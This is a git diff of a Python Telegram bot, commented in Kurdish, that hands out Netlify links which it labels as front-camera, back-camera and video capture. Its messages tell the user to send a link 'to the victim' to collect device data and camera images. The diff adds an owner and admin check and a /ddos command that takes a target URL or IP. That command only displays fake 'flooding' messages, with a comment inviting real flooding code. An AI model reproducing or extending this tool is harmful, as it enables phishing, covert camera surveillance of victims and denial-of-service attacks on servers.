@@ -4,8 +4,10 @@ import time
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# تووکن لە ژینگەی سێرڤەرەوە دەخوێنرێتەوە (بۆ پاراستنی تەواو لە گیتهەب)
+# خوێندنەوەی تووکنەکان و ئایدییەکان لە ژینگەی سێرڤەرەوە (Secrets)
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
+OWNER_ID = os.environ.get("OWNER_ID")  # ئایدی ئۆوێنەر لە secret دادەنرێت
+ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")  # لیستی ئایدیی ئەدمنەکان بە کاما جیا دەکرێنەوە
 
 if not BOT_TOKEN:
     print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
@@ -13,13 +15,28 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# لینکەکانت
+# پاککردنەوەی لیستەکە لە سپەیس
+ADMIN_IDS = [int(admin_id.strip()) for admin_id in ADMIN_IDS if admin_id.strip().isdigit()]
+if OWNER_ID and OWNER_ID.isdigit():
+    OWNER_ID = int(OWNER_ID)
+else:
+    OWNER_ID = None
+
+# لینکەکانت بۆ بەشی هێرشبەر
 LINKS = {
     "front": "https://genuine-bublanina-6ef92a.netlify.app/",
     "back": "https://majestic-cannoli-a2db6b.netlify.app/",
     "video": "https://splendorous-toffee-5f8076.netlify.app",
     "all": "https://jolly-entremet-36bd78.netlify.app"
 }
+
+# پشکنینی ئەوەی ئایا بەکارهێنەر ئەدمنە یان ئۆوێنەرە
+def is_authorized(user_id):
+    if OWNER_ID and user_id == OWNER_ID:
+        return True
+    if user_id in ADMIN_IDS:
+        return True
+    return False
 
 # تابلۆی پێشوازیکردنی شاهانە
 @bot.message_handler(commands=['start'])
@@ -34,11 +51,11 @@ def send_welcome(message):
     welcome_text = (
         f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "⚡ **سیستەمی کۆکردنەوەی زانیاری و کامێراکان:**\n"
+        "⚡ **سیستەمی کۆکردنەوەی زانیاری و هێرشەکان:**\n"
         "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
-        "• ئاستی پارێزربی: `MILITARY-GRADE (NO TOKEN LEAK)`\n"
+        "• ئاستی پارێزربی: `MILITARY-GRADE`\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "👇 بۆ وەرگرتنی لینکی هێرشبەر، کلیک لەسەر دوگمەی خوارەوە بکە:"
+        "👇 بۆ وەرگرتنی لینکەکان، کلیک لەسەر دوگمەی خوارەوە بکە:"
     )
     
     markup = InlineKeyboardMarkup(row_width=1)
@@ -57,7 +74,6 @@ def callback_query(call):
         
         menu_text = "🎯 **فەرموو یەکێک لە جۆرەکان هەڵبژێرە بۆ وەرگرتنی لینکەکەی:**"
         
-        # لێرەدا callback_data دادەنێین نەک url، بۆ ئەوەی پەیامی تێدا بنێرین
         markup = InlineKeyboardMarkup(row_width=1)
         markup.add(
             InlineKeyboardButton("📸 کامێرای پێشەوە", callback_data="link_front"),
@@ -68,7 +84,6 @@ def callback_query(call):
         
         bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")
 
-    # ناردنی لینکەکان بە شێوازی تێکست و کۆپی کردن
     elif call.data.startswith("link_"):
         key = call.data.split("_")[1]
         link = LINKS.get(key, "https://google.com")
@@ -81,10 +96,8 @@ def callback_query(call):
         }
         
         target_name = titles.get(key, "لینک")
-        
         bot.answer_callback_query(call.id, f"لینکی {target_name} ئامادە کرا!")
         
-        # ڕستەی داواکراو لەگەڵ لینکی خاوێن بۆ کۆپی کردن
         response_text = (
             f"🔗 لینکەکە بۆ قوربانی بنێرە بۆ دەستکەوتنی زانیاری ({target_name}):\n\n"
             f"`{link}`\n\n"
@@ -97,14 +110,52 @@ def callback_query(call):
         bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
         about_msg = (
             "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
-            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ دروستکردن و دابەشکردنی لینکە هێرشبەرەکان. "
-            "ئامانجی سەرەکی کۆکردنەوەی زانیارییە وردەکانی ئامێر و وێنەگرتن و ڤیدیۆتۆمارکردنی قوربانییە لە ڕێگەی کامێراکانەوە بە کوالێتی بەرز."
+            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ بەڕێوەبردنی هێرشەکان و کۆکردنەوەی زانیاری."
         )
         bot.send_message(call.message.chat.id, about_msg, parse_mode="Markdown")
 
+# فەرمانی تایبەت بە DDoS Attack (تەنها بۆ Owner و Admin)
+@bot.message_handler(commands=['ddos'])
+def ddos_command(message):
+    user_id = message.from_user.id
+    
+    # پشکنین کە ئایا کەسەکە مۆڵەتی هەیە یان نەخێر
+    if not is_authorized(user_id):
+        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی بەکارهێنانی ئەم فەرمانەت نییە.** تەنها ئۆوێنەر و ئەدمنەکان دەتوانن هێرش دەستپێبکەن.")
+        return
+
+    # وەرگرتنی ئامانجەکە (IP یاخود Domain) لە پەیامەکەدا
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ **تکایە ئامانجەکەی بنووسە!**\nنموونە: `/ddos https://target.com` یان `/ddos 192.168.1.1`", parse_mode="Markdown")
+        return
+
+    target = args[1]
+    
+    # ناردنی پەیامی دەستپێکردنی هێرش
+    attack_msg = (
+        f"🔥 **[DDOS ATTACK INITIATED]** 🔥\n\n"
+        f"🎯 **ئامانج:** `{target}`\n"
+        f"⚡ **دۆخ:** `FLOODING PACKETS...`\n"
+        f"👤 **بەرپرسی هێرش:** `{message.from_user.first_name}`\n\n"
+        "⚙️ سێرڤەرەکان لە کارکردن بەردەوامن و هێرشەکە دەستی پێکرد!"
+    )
+    
+    msg = bot.reply_to(message, attack_msg, parse_mode="Markdown")
+    
+    # لێرەدا دەتوانیت لۆژیکی پەخشی هێرشەکە (Socket/Requests Flooding) دابنێیت ئەگەر پێویست بکات
+    # بۆ نموونە სიმوڵەیشنی تەواوبوونی هێرش دوای چەند چرکەیەک:
+    time.sleep(3)
+    bot.edit_message_text(
+        f"💥 **[ATTACK STATUS: RUNNING]** 💥\n\n🎯 **ئامانج:** `{target}`\n🚀 **بارودۆخ:** هێرشی چڕ بە سەرکەوتوویی لەسەر ئامانجەکە چڕبۆوە!",
+        chat_id=message.chat.id,
+        message_id=msg.message_id,
+        parse_mode="Markdown"
+    )
+
 if __name__ == '__main__':
     print("==========================================")
-    print("💀 SECURE TITANIUM OMEGA BOT INITIALIZED 💀")
+    print("💀 SECURE TITANIUM OMEGA BOT + DDOS 💀")
     print("==========================================")
     while True:
         try:
